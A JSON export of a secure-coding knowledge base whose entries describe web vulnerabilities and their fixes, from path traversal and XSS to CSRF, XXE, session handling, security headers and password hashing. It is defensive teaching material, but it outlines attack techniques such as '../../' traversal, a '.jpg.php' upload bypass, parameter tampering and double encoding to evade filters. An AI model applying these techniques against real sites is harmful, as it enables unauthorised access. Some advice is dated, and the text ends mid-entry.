{"items": [{"kb_id": 1, "title": "use me for a header", "content": " Description:\n\nI am used as a header\n\n\n Solution:\n\nI am used as a header\n\n"}, {"kb_id": 2, "title": "Filename injection Path traversal", "content": " Description:\n\nA Path Traversal attack aims to access files and directories that are stored outside the web root folder. By browsing the application, the attacker looks for absolute links to files stored on the web server. By manipulating variables that reference files with dotdotslash (../); sequences and its variations, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and critical system files, limited by system operational access control. The attacker uses  ../../ sequences to move up to root directory, thus permitting navigation through the file system. This attack can be executed with an external malicious code injected on the path, like the Resource Injection attack.\n\n\n Solution:\n\nThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passing\nusersubmitted input to any filesystem/framework API. If this is not possible the application\ncan maintain a white list of files, that may be included on the page, and then use an identifier\n(for example the index number) to access the selected file. Any request containing an invalid\nidentifier has to be rejected, in this way there is no attack surface for malicious users to\nmanipulate the path.\n\n"}, {"kb_id": 3, "title": "XSS injection", "content": " Description:\n\nEvery time the application gets userinput, whether this showing it on screen or processing\nthis data in the application background, these parameters should be escaped for malicious\ncode in order to prevent crosssite scripting injections.\nWhen an attacker gains the possibility to perform an XSS injection,\nhe is given the opportunity to inject HTML and JavaScript code directly into the\napplication. This could lead to accounts being compromised by stealing session cookies or directly \naffect the operation of the target application. \n\nAltough templating engines(razor, twig, jinja, etc) and contextaware applications(Angular, React, etc)\ndo a lot of auto escaping for you. These frameworks should always be validated for effectiveness.\n\n\n Solution:\n\nIn order to prevent XSS injections, all userinput should be escaped or encoded.\nYou could start by sanitizing userinput as soon as it is inserted into the application,\nby preference using a so called whitelisting method.\nThis means you should not check for malicious content like the tags or anything,\nbut only allow the expected input. Every input which is outside of the intended operation\nof the application should immediately be detected and login rejected.\nDo not try to help use the input in any way because that could introduce a new type of attack by converting characters. \n\nThe second step would be encoding all the parameters or userinput before putting this in\nyour html with encoding libraries specially designed for this purpose.\n\nYou should take into consideration that there are several contexts for encoding userinput for\nescaping XSS injections. These contexts are amongst others:\n\n* HTML encoding, is for whenever your userinput is displayed directly into your HTML.\n* HTML attribute encoding, is the type of encoding/escaping that should be applied \n  whenever your user input is displayed into the attribute of your HTML tags.\n* HTML URL encoding, this type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.\n\nJavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods.\n\n"}, {"kb_id": 4, "title": "Command injection", "content": " Description:\n\nCommand injection is an attack in which the goal is execution of arbitrary commands on\nthe host operating system via a vulnerable application. Command injection attacks are\npossible when an application passes unsafe user supplied data\n(forms, cookies, HTTP headers etc.) to a system shell. In this attack,\nthe attackersupplied operating system commands are usually executed with the privileges\nof the vulnerable application. Command injection attacks are possible largely due to\ninsufficient input validation. This attack differs from Code Injection, in that code\ninjection allows the attacker to adds his own code that is then executed by the application.\nIn Code Injection, the attacker extends the default functionality of the application\nwithout the necessity of executing system commands.\n\n Solution:\n\nUserinput that is used in a shell command should not contain dangerous characters.\nA blacklist of characters is not a good option because it may be difficult to think of\nall of the characters to validate against. A white list containing only allowable\ncharacters should be created to validate the userinput.\n"}, {"kb_id": 5, "title": "Cross site request forgery", "content": " Description:\n\nCrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,\nemail, blog, instant message, or program causes a users Web browser to perform an unwanted\naction on a trusted site for which the user is currently authenticated.\n\nThe impact of a successful crosssite request forgery attack is limited to the\ncapabilities exposed by the vulnerable application. For example, this attack could result\nin a transfer of funds, changing a password, or purchasing an item in the users context.\nIn effect, CSRF attacks are used by an attacker to make a target system perform a\nfunction (funds Transfer, form submission etc.) via the targets browser without\nknowledge of the target user at least until the unauthorised function has been committed.\n\n Solution:\n\nTo arm an application against automated attacks and tooling you need to use unique tokens\nwhich are included into the forms of an application, API calls or AJAX requests.  \nAny state changing operation requires a secure random token (e.g CSRF token) to prevent\nagainst CSRF attacks. Characteristics of a CSRF Token are a unique, large random\nvalue generated by a cryptographically secure random number generator.\n\nThe CSRF token is then added as a hidden field for forms and validated on the sever side whenever\na user is sending a request to the server.\n\nNote :\nWhenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent\nin the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar.\n"}, {"kb_id": 6, "title": "XXE injections", "content": " Description:\n\nProcessing of an Xml eXternal Entity containing tainted data may lead to the disclosure of\nconfidential information and other system impacts.\nThe XML 1.0 standard defines the structure of an XML document.\nThe standard defines a concept called an entity, which is a storage unit of some type.\n\nThere exists a specific type of entity, an external general parsed entity often shortened\nto an external entity, that can access local or remote content via a declared system\nidentifier and the XML processor may disclose confidential information normally not\naccessible by the application. Attacks can include disclosing local files, which may\ncontain sensitive data such as passwords or private user data.\n\n Solution:\n\nDisable the possibility to fetch resources from an external source.\nThis is normally done in the configuration of the used XML parser.\n"}, {"kb_id": 7, "title": "X Path injections", "content": " Description:\n\nWeb applications heavily use databases to store and access the data they need for their\noperations. Historically, relational databases have been by far the most common\ntechnology for data storage, but in the last years, we are witnessing an increasing\npopularity for databases that organise data using the XML language.\nJust like relational databases are accessed via SQL language, XML databases use XPath as\ntheir standard query language.\n\n Solution:\n\nJust like the techniques to avoid SQL injection, you need to use a parameterised XPath\ninterface if one is available, or escape the user input to make it safe to include in a\ndynamically constructed query. If you are using quotes to terminate untrusted input in a\ndynamically constructed XPath query, then you need to escape that quote in the untrusted\ninput to ensure the untrusted data can not try to break\nout of that quoted context.\n"}, {"kb_id": 8, "title": "XML injection", "content": " Description:\n\nXML Injection is an attack technique used to manipulate or compromise the logic of an XML\napplication or service. The injection of unintended XML content and/or structures into\nan XML message can alter the intended logic of the application. Further, XML injection\ncan cause the insertion of malicious content into the resulting message/document.\n\n Solution:\n\nIn addition to the existing input validation, define a positive approach which\nescapes/encodes characters that can be interpreted as XML. At a minimum this includes\nthe following: < > / \" ''\n"}, {"kb_id": 9, "title": "XSLT injections", "content": " Description:\n\nA vulnerability occurs when an XSL file is loaded from a source controlled by an attacker.\nWhen the attacker is given the opportunity to specify the source of the included XSL file\nhe could include a file which contains malicious code to be parsed on the target application.\nThis could lead to, code execution, reading arbitrary files and many more\nvulnerabilities such as XSS.\n\n Solution:\n\nTo protect against such vulnerability one needs to make sure that he does not use\nusersupplied input in the XSL filename.\nThe best solution would be to define a list of permitted filenames and\nonly accept XSL filenames from that list.\n"}, {"kb_id": 10, "title": "External DTD parsing", "content": " Description:\n\nProcessing of an external entity containing tainted data may lead to the disclosure of confidential information and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There exists a specific type of entity, an external general parsed entity often shortened to an external entity that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity.\nThe XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\nSince the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via HTTP(s) requests. In some situations, an XML processor library that is vulnerable to clientside memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.\n\n\n Solution:\n\nDisable the XML DTD (Document Type Definition) parsing. This can be set when initiating the XML parser.\n"}, {"kb_id": 11, "title": "LDAP injection", "content": " Description:\n\nLDAP (Lightweight Directory Access Protocol) Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it is possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.\n\n Solution:\n\nThe best way to prevent LDAP injection is to use a positive validation scheme for ensuring that the data going into your queries does not contain any attacks. However, in some cases, it is necessary to include special characters in the input that is passed into an LDAP query. In this case, using escaping can prevent the LDAP interpreter from thinking those special characters are actually part of the LDAP query.\n"}, {"kb_id": 12, "title": "SSI injections", "content": " Description:\n\nWeb servers usually give developers the ability to add small pieces of dynamic code inside\nstatic HTML pages, without having to deal with fullfledged serverside\nor clientside languages.\n\nThis feature is incarnated by the ServerSide Includes (SSI).\nThe attacker will try to inject code into the application that will\nbe interpreted by SSI mechanisms. A successful exploitation of this vulnerability\nallows an attacker to inject code into HTML pages or even perform remote code execution.\n\n Solution:\n\nThe SSI handler on the webserver should not be activated when it is not used.\n"}, {"kb_id": 13, "title": "File upload injections", "content": " Description:\n\nUploaded files represent a significant risk to applications.\nThe first step in many attacks is to get some code to the system to be attacked.\nThen the attack only needs to find a way to get the code executed. Using a file upload\nhelps the attacker accomplish the first step.\n\nThe consequences of unrestricted file upload can vary, including complete system takeover,\nan overloaded file system or database, forwarding attacks to backend systems, and simple\ndefacement.\n\nThere are really two classes of problems here.\nThe first is with the file metadata, like the path and file name.\nThese are generally provided by the transport, such as HTTP multipart encoding.\nThis data may trick the application into overwriting a critical file or storing the file\nin a bad location. You must validate the metadata extremely carefully before using it.\n\nThe other class of problem is with the file size or content.\nAn attacker can easily craft a valid image file with PHP code inside.\n\n Solution:\n\n Uploaded files always need to be placed outside the document root of the webserver\n Check to not accept large files that could fill up storage or cause a denial of service attack\n Check the userinput(filename) for having the right allowed extensions such as .jpg, .png etc\n  Note: when checking these extensions always make sure your application validates the last\n  possible extension so an attacker could not simply inject \".jpg.php\" and bypass your\n  validation\n\n Check the userinput(filename) for containing possible path traversal patterns in order to prevent him from uploading outside of the intended directory.\n\nYou may also want to check if the filenames do already exist before uploading in order to\nprevent the overwriting of files.\n\nAlso for serving the files back there needs to be a file handler function that can select\nthe file based on an identifier that will serve the file back towards the user.\n\nMost developers also do a mimetype check. This is a good protection however not\nwhenever you are checking this mimetype through the post request. This header can not be\ntrusted since it can be easily manipulated by an attacker.\n\nThe best way to check the mimetype\nis to extract the file from the server after uploading and check it from the file itself.\nDeleting it whenever it does not comply with expected values.\n\n"}, {"kb_id": 14, "title": "Version management", "content": " Description:\n\nWhenever a programmer decides to use third party software,\nhe should keep an eye implementing a proper version management methodology for this software.\nWhen hackers discover vulnerabilities they often publish these exploits online in order\nto push the developers of this software to fix their issues. As a result,\nwhen your software is not upgraded to the latest available version,\nscript kiddies could easily compromise your application by following the\nexploit tutorials online, thus compromising your application.\n\n Solution:\n\nOne option is not to use components that you did not write.\nBut that is not very realistic.\n\nMost component projects do not create vulnerability patches for old versions.\nInstead, most simply fix the problem in the next version. So upgrading to these new\nversions is critical.\nSoftware projects should have a process in place to:\n\nIdentify all components and the versions you are using, including all dependencies.\n(e.g., the versions plugin).\n\nMonitor the security of these components in public databases,\nproject mailing lists, and security mailing lists, and keep them up to date.\n\nEstablish security policies governing components use, such as requiring certain software\ndevelopment practices, passing security tests, and acceptable licenses.\n\nWhere appropriate, consider adding security wrappers around components to disable unused\nfunctionality and/ or secure weak or vulnerable aspects of the component.\n\nThis also goes for all other components that should be up to date with proper security\nconfiguration(s) and version(s) such as server OS etc.\n\nThis should include removal of unneeded configurations and folders such as sample\napplications, platform documentation, and default or example users.\n"}, {"kb_id": 15, "title": "Verbose error messaging", "content": " Description:\n\nAn important aspect of secure application development is to prevent information leakage. \nError messages give an attacker great insight into the inner workings of an application.\n\nThe purpose of reviewing the Error Handling code is to assure the application fails safely under all \npossible error conditions, expected and unexpected. No sensitive information is presented to the user \nwhen an error occurs.\n\nWhen an exception or error is thrown we also need to log this occurrence. Sometimes this is due to bad\ndevelopment, but it can be the result of an attack or some other service your application relies on failing.\n\nAll code paths that can cause an exception to be thrown should check for success in order for the exception \nnot to be thrown.\n\n Solution:\n\nWe should use a localized description string in every exception, a friendly error reason such as \u201cSystem Error \u2013 Please try again later\u201d. When the user sees an error message, it will be derived from this description string of the exception that was thrown, and never from the exception class which may contain a stack trace, line number where the error occurred, \nclass name or method name.\n\nDo not expose sensitive information in exception messages. Information such as paths on the local file system is considered privileged information; any system internal information should be hidden from the user. As mentioned before an attacker could use this information to gather private user information from the application or components that make up the app.\n\nDon\u2019t put people\u2019s names or any internal contact information in error messages. Don\u2019t put any \u201chuman\u201d information, which would lead to a level of familiarity and a social engineering exploit.\n\nAnother good example would be for password forget functions to throw a generic error message when a email adress\nis or is not known on the system. This should prevent enumeration of email adresses.\n\n"}, {"kb_id": 16, "title": "Debug enabeling", "content": " Description:\n\nSometimes it is possible through an \"enabling debug parameter\" to display technical\ninformation/secrets within the application. As a result, the attacker learns more about the\noperation of the application, increasing his attack surface. Sometimes having a debug flag \nenabled could even lead to code execution attacks (older versions of werkzeug) \n\n Solution:\n\nDisable the possibility to enable debug information on a live environment.\n"}, {"kb_id": 17, "title": "Robots.txt", "content": " Description:\n\nEach site uses a robots.txt file which allows search engines to provide information.\nThe robots.txt determines what pages may or may not be indexed by google or yahoo etc.\nHowever, a common mistake made by programmers is applying a blacklisting method causing\nthe application displaying sensitive information to attackers.\n\n Solution:\n\nInstead of the blacklisting method:\n\nUseragent: *\nDisallow: /squirrelmail/\nDisallow: /admin/\nDisallow: /modules/\n\nYou should use a whitelisting method:\n\nUseragent: *\nDisallow: *\nAllow: /index.html\nAllow: /home.html\n"}, {"kb_id": 18, "title": "Accessible non parsed dynamic scripts", "content": " Description:\n\nApplications often include files in other pages. When these files can be directly\napproached by normal users, the operation of the application can be traced because the\nsource code becomes available. This improves the possibility that the attacker discovers\nvulnerabilities.\n\nIt is also highly recommended that old files are removed from the server and not beind stored\nor backuped as i.e \"file.php.old\". \n\n Solution:\n\nAlways add the different types of extensions to the webserver handler to parse.\nThis way the file source cannot be viewed.\n"}, {"kb_id": 19, "title": "Include anti caching headers", "content": " Description:\n\nAnticaching headers have the ability to tell the browser,\ncomputer and proxies what information they may or may not store on the intermediate media\n\n Solution:\n\nThese headers are also known as the: Cachecontrol: nostore,nocache and provide\nprotection of sensitive information when implemented in the application or webserver.\n\nRightly configured anti caching headers will look like the following as a response\n\n\tExpires: Tue, 03 Jul 2001 06:00:00 GMT\n\tLastModified: {now} GMT\n\tCacheControl: nostore, nocache, mustrevalidate, maxage=0\n\tCacheControl: postcheck=0, precheck=0\n\tPragma: nocache\n"}, {"kb_id": 20, "title": "Include anti clickjacking headers", "content": " Description:\n\nClickjacking, also known as a \"UI redress attack\", is when an attacker uses multiple\ntransparent or opaque layers to trick a user into clicking on a button or link on another\npage when they were intending to click on the top level page. Thus, the attacker is\n\"hijacking\" clicks meant for their page and routing them to another page, most likely\nowned by another application, domain, or both.\n\nUsing a similar technique, keystrokes can also be hijacked. With a carefully crafted\ncombination of stylesheets, iframes, and text boxes, a user can be led to believe they\nare typing in the password to their email or bank account, but are instead typing into an\ninvisible frame controlled by the attacker.\n\n Solution:\n\nTo avoid your application from being clickjacked you can add the XframeOptions header\nto your application. These headers can be configured as:\n\n    XframeOptions: deny\n\nThe page cannot be displayed in a frame, regardless of the site attempting to do so.\n\n    XFrameOptions: sameorign  \n\nThe page can only be displayed in a frame on the same origin as the page itself.\n\n    XFrameOptions: ALLOWFROM uri\n\nThe page can only be displayed in a frame on the specified origin.\n\nYou may also want to consider to include \"Framebreaking/Framebusting\" defense for legacy\nbrowsers that do not support XFrameOption headers.\n\nSource:\nhttps://www.codemagi.com/blog/post/194\n"}, {"kb_id": 21, "title": "Include X XSS", "content": " Description:\n\nThis header enables the Crosssite scripting (XSS) filter built into most recent\nweb browsers. It is usually enabled by default anyway, so the role of this header is to reenable the filter for this particular website if it was disabled by the user. This header is supported in IE 8 and in Chrome 4.\n\n Solution:\n\nThese headers are also known as the: XXSSProtection: 1; mode=block and provide protection against XSS attacks when implemented in the application or webserver.\n\nNOTE:\nThis header only protects against some reflected XSS attacks. This is no substitute for normal escaping and input filtering and sanitization.\n"}, {"kb_id": 22, "title": "Include X Content Type Options header", "content": " Description:\n\nThe only defined value, nosniff, prevents Internet Explorer and Google Chrome from\nMIMEsniffing a response away from the declared contenttype.\nThis also applies to Google Chrome, when downloading extensions.\nThis reduces exposure to driveby download attacks and sites serving user uploaded\ncontent that, by clever naming, could be treated by MSIE as executable or dynamic HTML\nfiles.\n\n Solution:\n\nThese headers are also known as the: XContentTypeOptions: nosniff;\nand provide protection against Mime content type attacks when implemented in the\napplication or webserver.\n"}, {"kb_id": 25, "title": "Include Strict Transport Security header", "content": " Description:\n\nHTTP StrictTransportSecurity (HSTS) enforces secure (HTTP over SSL/TLS) connections to\nthe server. This reduces the impact of bugs in web applications leaking session data through\ncookies and external links and defends against Maninthemiddle attacks. HSTS also\ndisables the ability for user''s to ignore SSL negotiation warnings\n\n Solution:\n\nThese headers are also known as the: StrictTransportSecurity: maxage=16070400:\nincludeSubDomains and provide protection against SSL Strip attacks when implemented in the\napplication or web server.\n\nWhen connecting to an HSTS host for the first time, the browser won''t know whether or not\nto use a secure connection, because it has never received an HSTS header from that host.\nConsequently, an active network attacker could prevent the browser from ever connecting\nsecurely (and even worse, the user may never realize something is amiss). To mitigate\nthis attack, you can add your application to a preload list which makes HSTS enforced by default.\nWhen a user connects to one of these hosts for the first time, the browser will know that\nit must use a secure connection. If a network attacker prevents secure connections to the\nserver, the browser will not attempt to connect over an insecure protocol, thus\nmaintaining the user''s security.\n\nVisit:\n    https://hstspreload.appspot.com/\nHere you can find how to add your application to HSTS preload\n"}, {"kb_id": 26, "title": "Sensitive information stored in cookies", "content": " Description:\n\nSensitive data should not be stored in a cookie,because the cookie is also used on the clientside and is adaptable thus making\nits content readable. A hacker could gain access to a cookie through cross site scripting\nattacks and gain the sensitive information stored\nin the targets cookie.\n\n Solution:\n\nDo not store sensitive information in cookies.\n"}, {"kb_id": 27, "title": "Client side state management", "content": " Description:\n\nAn application can implement all kinds of logic rules through JavaScript and HTML.\nHowever, these are clientside constraints that a hacker can easily disable or modify.\n\n Solution:\n\nUser restrictions should always be imposed by serverside techniques instead\nof clientside constraints.\n"}, {"kb_id": 28, "title": "Too verbose authentication", "content": " Description:\n\nThe error messages that are displayed when a user fails to login into an application\nshould be selected with caution. When this error message gives away too much information,\nthis information can be exploited by a hacker.\n\n Solution:\n\nThe application should never publish available usernames. When an attacker gains this\ninformation he increases his attack vector and reduces the time\nrequired to identify accounts.\n\nI.e:\n\nImagine a forgot password function where the user enters his username in order for the\napplication to send a new password to his email address, the user enters a correct username\nand the application responds with:\n\n\u201cEmail successfully sent to your email address.\u201d When the user enters an incorrect username it says,  \u201cError: user does not exist.\u201d\n\nThis function would be vulnerable to username enumeration\n"}, {"kb_id": 29, "title": "Brute force password guessing", "content": " Description:\n\nLogin functions should not be abused in an automated way that an attacker could create a\nscript that contains a list of usernames and passwords, which he could use against your\nlogin function in order to gain unauthorized access to user accounts.\n\n Solution:\n\nImplement a method that limits the amount of tries with automated tools.\nSome examples are using a CAPTCHA or a TARPIT(ratelimiting) method.\n\nBe aware that a simple limitation on number of tries may be used as a method to perform denialofservice attack and hence to block certain users like system administrator from logging in. A mechanism combines tries limit with challengeresponse test can be used to prevent this risk while providing convenience for actual user login. For example, start to ask user to complete a CAPTCHA or a TARPIT question during login after a certain number of tries is reached.\n"}, {"kb_id": 30, "title": "Denial of service by locking out accounts", "content": " Description:\n\nWhenever the opportunity to log into the application is offered, it should not lock out accounts. A hacker could abuse this function to make the application deny access towards its power users.\n\n Solution:\n\nThe application should not lockout users when they enter false login credentials.\n"}, {"kb_id": 31, "title": "Predictable password and or token generation", "content": " Description:\n\nTokens or passwords that are used within the application must contain high entropy in\norder to prevent the prediction of these values.\n\n Solution:\n\nTokens should contain a high level entropy and randomness to prevent predictable token generation.\nAll random numbers, random file names, random GUIDs, and random must be generated using\nthe cryptographic module''s approved random number generator\nwhen these random values are intended to be unguessable by an attacker.\n"}, {"kb_id": 32, "title": "Unauthorized credential changes", "content": " Description:\n\nAn application which offers user login functionality, usually has an administration page\nwhere userdata can be modified. When the user wants to change this data he should\nspecify his current password.\n\n Solution:\n\nWhen changing user credentials or email address the user must always enter a valid\npassword in order to implement the changes. This is also called reauthentication or\nstepup / adaptive authentication. Whenever a user \"reauthenticates\" himself the current\nsession ID value should also be refreshed in order to fend oFf so called \"session hijackers\"\n"}, {"kb_id": 33, "title": "Double decoding of headers parameters", "content": " Description:\n\nDouble decoding is a problem which often occurs when multiple servers are used in which a\nconfiguration error is made.\nA hacker can encode his payload differently so it will not be recognized by a Web Application Firewall (WAF) or an Intrusion Detection System (IDS) and also bypass the escaping of the application.\n\nBy using double encoding it''s possible to bypass security filters that only decode user\ninput once. The second decoding process is executed by the backend platform or modules\nthat properly handle encoded data, but don''t have the corresponding security checks in\nplace.\n\nAttackers can inject double encoding in pathnames or query strings to bypass the\nauthentication scheme and security filters in use by the web application.\n\n Solution:\n\nOnly one webserver should decode/encode the data.\n"}, {"kb_id": 34, "title": "Resource identifier injection", "content": " Description:\n\nA resource identifier injection basically means that the attacker can determine which\nresources are loaded into the web application.\nAn attacker could thus influence the operation of the web application and redirect users\nto other websites. This attack consists of changing resource identifiers used by an\napplication in order to perform a malicious task. When an application permits a user\ninput to define a resource, like a file name or port number,\nthis data can be manipulated to execute or access different resources.\nIn order to be properly executed, the attacker must have the possibility to specify a\nresource identifier through the application form and the application must permit the execution.\nThe resource type affected by user input indicates the content type that may be exposed.\nFor example, an application that permits input of special characters like period, slash,\nand backlash is risky when used in methods that interact with the file system.\nThe resource injection attack focuses on accessing other resources than the local\nfilesystem, which is different attack technique known as a Path Manipulation attack.\n\n Solution:\n\nSafe use of resource identifiers can be done by performing authorisation checks if the\nidentifier belongs to the user.\n"}, {"kb_id": 35, "title": "Dynamic scripting injection", "content": " Description:\n\nWhen user input is used to evaluate scripting code, highsecurity risks could be introduced. If the input is not properly escaped an attacker can inject his own script code and gain access to the server.\n\n Solution:\n\nDo not use direct userinput in the dynamic scripting function. You should first\nuse an input validation or encoding function on the user submitted data to clean and\nsanitize the input against malicious intent.\n"}, {"kb_id": 36, "title": "Regular expression injection", "content": " Description:\n\nIf the application uses regular expressions which receive user input,\nthen the user input should be properly escaped.\nIf not done properly, then the hacker can affect the regular expression and modify their\nlogic. In some cases, an attacker could even gain access to the server.\n\n\n Solution:\n\nDo not use userinput without escaping in a regular expression \"regex pattern\",\nSince this could lead to serious security vulnerabilities.\n"}, {"kb_id": 37, "title": "Automated spamming via feedback scripts", "content": " Description:\n\nA hacker must not gain the ability to abuse an applications email functionality by\nmeans of scripts which sends automated spamming mails.\n\n Solution:\n\nThis problem could be prevented by implementing CAPTCHA or ratelimiting mechanisms.\n"}, {"kb_id": 38, "title": "Session cookies without the Secure attribute", "content": " Description:\n\nThe secure flag is an option that can be set when creating a cookie.\nThis flag ensures that the cookie will not be sent over an unencrypted\nconnection by the browser,which ensures that the session cookie can not be sent over a nonencrypted link.\n\n Solution:\n\nWhen creating a session cookie which is sent over an encrypted connection\nyou should set the secure flag. The Secure flag should be set during every setcookie.\nThis will instruct the browser to never send the cookie over HTTP.\nThe purpose of this flag is to prevent the accidental exposure of a cookie value if a user\nfollows an HTTP link.\n\n\n"}, {"kb_id": 39, "title": "Session cookies without the HttpOnly attribute", "content": " Description:\n\nAn HttpOnly flag is an option that can be set when creating a cookie. This v ensures that the cookie cannot be read or edited by JavaScript. This ensures an attacker cannot steal this cookie as a crosssite scripting vulnerability is present in the application.\n\n Solution:\n\nThe HttpOnly flag should be set to disable malicious script access to the cookie values such as the session ID value. Also, disable unnecessary HTTP request methods such as the TRACE option. Misconfiguration of the HTTP request headers can lead to stealing the session cookie even though HttpOnly protection is in place.\n"}, {"kb_id": 40, "title": "External session hijacking", "content": " Description:\n\nWhen an attacker obtains a users session cookie, then he can steal the identity of the\nuser which the session cookie belongs to.\n\n Solution:\n\nAs soon as a session is set for an authenticated user,\nthe server should keep track of the IP address in which the user used when he started the session.\nWhen the server discovers a change in IP address, for instance when an attacker hijacks an\nusers session. The server then should deny access, destroy the session and redirect the\n''hijacker'' to the login page.\n"}, {"kb_id": 41, "title": "Insecure transmission of session cookies", "content": " Description:\n\nIf the session cookies are sent over an unencrypted connection,\nthey should be withdrawn immediately.\nThese cookies are not to be trusted anymore as a hacker may have captured their values.\n\n Solution:\n\nSession cookies that are used to authenticate the user should always be set on a\nsecure connection.\n\nIn order to achieve this, you should set the \"secure\" flag on your session cookie\nto make sure your application in any circumstance does not send this cookie over nonHTTPS connections.\n"}, {"kb_id": 42, "title": "Unproven cryptographic algorithms", "content": " Description:\n\nThe encryption techniques used in the application must be known and proven methods.\nWhen there is a selfmade hashing algorithm developed, it is likely to contain\nvulnerabilities due to mathflaws resulting in encryption which can be broken.\n\n Solution:\n\nNever implement your own designed Crypto functions.\nVerify that cryptographic modules used by the application have been validated against\nFIPS 1402 or an equivalent standard.\n"}, {"kb_id": 43, "title": "Client side authentication", "content": " Description:\n\nAn application could implement authentication functionalities through JavaScript and HTML.\nHowever, these are clientside constraints that are imposed, which means that a hacker\ncan easily disable or modify these constraints.\n\n Solution:\n\nNever implement clientside authentication constraints, since these are easily bypassed.\nWhen implementing authentication methods always use serverside solutions.\n"}, {"kb_id": 44, "title": "Identifier based authorization", "content": " Description:\n\nAn application uses parameters in order to process data.\nThese parameters can also be used to assign certain roles and retrieve\nContent corresponding with those parameters.\nFor example:\n\n    www.target.com/index.php?loggedin=user\n\nIn this situation the application will get content and subscribe user roles corresponding to the user parameter.\n\n    www.target.com/index.php?loggedin=admin\n\nIn this situation the application will get content and subscribe user roles corresponding to the admin parameter.\n(Note: the above two links are no longer available.)\n\n Solution:\n\nWhenever you are checking whether a user is restricted to review certain data, the access\nrestrictions should be processed serverside.\n\nThe userID should be stored inside of a session variable on login and should be used to\nretrieve user data from the database like : SELECT data from personaldata where userID=:id < session var\n\nNow a possible attacker cannot tamper and change the application operation since the\nidentifier for retrieving the data is handled serverside.\n"}, {"kb_id": 45, "title": "Principle of complete mediation", "content": " Description:\n\nThroughout development of the application, there must be perpetual checks in place to check\nif all pages and resources by default require authentication except those specifically intended to be public.\n\nSometimes developers simply forget to implement these checks, or they remove the checks \ntemporarily for testing purposes. \n\n Solution:\n\nVerify all access controls are implemented properly in order to prevent a user access data/functions which \nhe was not intended to use.\n"}, {"kb_id": 46, "title": "Prepared statements and query parameterization", "content": " Description:\n\nAll SQL queries, HQL, OSQL, NOSQL and stored procedures, related to stored procedures should be\nprotected by the use of query parameterization.\nIf an attacker can inject malicious code into these queries and gain the ability to\nmanipulate them and can withdraw, update and delete data which is stored on the\ntarget database.\n\n Solution:\n\nThe use of prepared statements and parameterized queries is how all developers should\nfirst be taught how to write database queries. They are simple to write, and easier to\nunderstand than dynamic queries. Parameterized queries force the developer to first define\nall the SQL code, and then pass in each parameter to the query later. This coding style\nallows the database to distinguish between code and data, regardless of what user input\nis supplied.\n"}, {"kb_id": 51, "title": "Are all passwords hashed, salted and stretched", "content": " Description:\n\nVerify that account passwords are one way hashed with a salt, and there is sufficient work \nfactor to defeat brute force and password hash recovery attacks.\n\n Solution:\n\nRecommended for password usage are PBKDF functions. PBKDF2 uses a pseudorandom function \nand a configurable number of iterations to derive a cryptographic key from a password. \nBecause this process is difficult to reverse (similar to a cryptographic hash function)\nbut can also be configured to be slow to compute, key derivation functions are ideally \nsuited for password hashing use cases.\n\nAnother alternative would be bcrypt. bcrypt is a password hashing function designed by \nNiels Provos and David Mazi\u00e8res, based on the Blowfish cipher, and presented at USENIX in \n1999. Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an \nadaptive function: over time, the iteration count can be increased to make it slower, \nso it remains resistant to bruteforce search attacks even with increasing computation power.\n"}, {"kb_id": 52, "title": "Sensitive information transmitted by unencrypted methods", "content": " Description:\n\nWhenever sensitive information is sent by unencrypted methods an attacker could intercept\nthis data and use this for malicious intents.\n\n Solution:\n\nAll sensitive information should always be sent by encrypted methods\nsuch as HTTPS(TLS) connections.\n\n\n"}, {"kb_id": 53, "title": "Session information is not stored server side", "content": " Description:\n\nWhenever session information is not stored on the serverside an attacker could easily tamper\nand manipulate these values. This is always a bad idea and you should not do this!\n\n Solution:\n\nSession information should always be stored  on the serverside by means of a serverside language.\n"}, {"kb_id": 54, "title": "The crossdomain xml should only contains trusted domains", "content": " Description:\n\nThe use of a crossdomain.xml file is required when the web application uses Flash.\nThis file is used to set up restrictions for any other web servers using the\nflash application. If these are not set correctly, an attacker could exploit this to\nexecute targeted attacks against the users of the web application.\n\n Solution:\n\nAlways make sure the crossdomain.xml only contains trusted domains.\n"}, {"kb_id": 55, "title": "Session ids should be generated with sufficient entropy", "content": " Description:\n\nWhenever session IDs are not generated with a sufficient entropy this could lead to a\nsession collision or session hijacking. If an attacker can guess an authenticated user''s\nsession identifier, he can take over the user''s session.\n\n Solution:\n\nThe WebLogic deployment descriptor should specify a session identifier length of at\nleast 128 bits. A shorter session identifier leaves the application open to\nbruteforce session guessing attacks.\n"}, {"kb_id": 56, "title": "User generated session ids should be rejected by the server", "content": " Description:\n\nWhenever user generated session IDs are not rejected by the server,\nan attacker could change the session credentials given by the server on the targets\ncomputer into an easy to remember value.\n\nThe attacker then changes his own session credentials with the easily to remember\nvalue he used on the target''s computer. Through this,  the attacker could do a session hijacking\non the targets current session.\n\n Solution:\n\nAll session IDs not generated by the server should be rejected.\n"}, {"kb_id": 57, "title": "The logout functionality should revoke the complete session", "content": " Description:\n\nWhen the logout functionality does not revoke the complete session, an attacker could still\nimpersonate a user when he has access to the session cookie even after the user is logged off the application.\n\n Solution:\n\nThe logout functionality should revoke the complete session whenever a user\nwants to terminate his 